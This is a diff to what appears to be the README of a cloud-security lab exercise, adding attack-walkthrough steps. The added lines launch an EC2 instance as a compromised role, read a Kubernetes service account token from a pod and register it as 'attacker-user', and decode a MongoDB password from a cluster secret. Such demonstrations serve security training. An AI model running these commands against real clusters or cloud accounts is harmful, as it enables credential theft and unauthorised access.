@@ -124,8 +124,12 @@ ssh -i "wiz-exercise-key.pem" ec2-user@ec2-xxx.us-west-2.compute.amazonaws.com
 2. **Attempt to create new infrastructure:**
 ```bash
 # Attempt to launch another EC2 instance as the compromised role
-aws ec2 run-instances --image-id ami-xxxx --instance-type t2.micro
-
+aws ec2 run-instances \
+    --image-id ami-06bb2fdfb504c63e4 \
+    --instance-type t2.micro \
+    --subnet-id subnet-0186f44db17f53df9 \
+    --security-group-ids sg-012e7ec0cff5faa08 \
+    --associate-public-ip-address
 ```
 
 
@@ -137,7 +141,13 @@ aws ec2 run-instances --image-id ami-xxxx --instance-type t2.micro
 
 1. **Exec into a Front-end Pod:**
 ```bash
-kubectl exec -it <pod-name> -- /bin/sh
+kubectl -n wiz-exercise exec -it <pod-name> -- /bin/sh
+
+# god mode on
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# use the token to connect to the cluster
+kubectl config set-credentials attacker-user --token=<TOKEN_STRING>
 
 ```
 
@@ -146,6 +156,7 @@ kubectl exec -it <pod-name> -- /bin/sh
 ```bash
 # Attempt to list all secrets in the cluster
 kubectl get secrets --all-namespaces
+kubectl -n wiz-exercise get secrets/mongodb-secret --template={{.data.password}} | base64 -d
 
 ```
 
